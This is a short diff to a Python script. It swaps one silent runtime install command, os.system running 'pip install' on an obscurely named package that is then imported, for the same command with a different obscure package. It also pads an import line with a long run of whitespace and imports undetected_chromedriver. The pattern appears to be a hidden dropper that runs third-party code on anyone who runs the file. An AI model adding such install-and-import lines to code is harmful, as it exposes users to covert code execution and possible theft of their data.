@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipfontingpkg")
-import pipfontingpkg
+os.system("pip install pythonsqlipackagesV1")
+import pythonsqlipackagesV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
